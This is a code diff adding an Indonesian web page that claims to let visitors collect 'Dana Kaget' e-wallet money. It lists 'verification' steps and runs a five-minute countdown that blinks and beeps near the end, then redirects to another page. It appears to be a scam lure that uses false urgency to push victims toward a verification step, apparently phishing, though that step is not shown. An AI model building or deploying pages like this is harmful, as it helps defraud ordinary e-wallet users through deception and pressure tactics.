@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="refresh" content="300;url=yah.html">
+  <title>Klaim Dana Kaget</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+      background: #f3f4f6;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px;
+    }
+
+    .card {
+      background: white;
+      max-width: 800px;
+      width: 100%;
+      border-radius: 16px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.1);
+      overflow: hidden;
+      text-align: center;
+      animation: fadeIn 0.6s ease;
+    }
+
+    .card h1 {
+      margin: 0;
+      padding: 20px;
+      font-size: 24px;
+      color: #1f2937;
+      background-color: #e5e7eb;
+    }
+
+    .card img {
+      width: 100%;
+      display: block;
+    }
+
+    .card p {
+      font-size: 16px;
+      color: #374151;
+      padding: 20px;
+      margin: 0;
+      border-top: 1px solid #e5e7eb;
+    }
+
+    #timer {
+      font-weight: bold;
+      color: #dc2626;
+      padding-bottom: 20px;
+      font-size: 18px;
+    }
+
+    .blink {
+      animation: blinker 1s linear infinite;
+    }
+
+    @keyframes blinker {
+      50% { opacity: 0; }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (max-width: 600px) {
+      .card h1 {
+        font-size: 20px;
+      }
+
+      .card p {
+        font-size: 14px;
+        padding: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Verifikasi Klaim Dana Kaget</h1>
+    <img src="A_two-step_digital_illustration_in_Indonesian_prov.png" alt="Ilustrasi dua langkah verifikasi klaim dana kaget" loading="lazy">
+    <p>
+      1. Periksa notifikasi yang muncul di ponsel Anda<br>
+      2. Tekan tombol <strong>Verifikasi</strong><br> 
+      3. Lakukan secepat mungkin agar tidak kehabisan
+    </p>
+    <div id="timer">Sisa waktu: 5:00</div>
+    <audio id="beep-sound" src="https://cdn.pixabay.com/audio/2021/08/04/audio_c4577fa500.mp3" preload="auto"></audio>
+  </div>
+
+  <script>
+    let timeLeft = 300; // 5 menit dalam detik
+    const timerEl = document.getElementById('timer');
+    const beep = document.getElementById('beep-sound');
+
+    const countdown = setInterval(() => {
+      timeLeft--;
+
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerEl.textContent = `Sisa waktu: ${minutes}:${seconds.toString().padStart(2, '0')}`;
+
+      // Saat 10 detik terakhir, beri efek berkedip dan suara
+      if (timeLeft <= 10 && timeLeft > 0) {
+        timerEl.classList.add('blink');
+        beep.currentTime = 0;
+        beep.play();
+      }
+
+      if (timeLeft <= 0) {
+        clearInterval(countdown);
+        timerEl.classList.remove('blink');
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
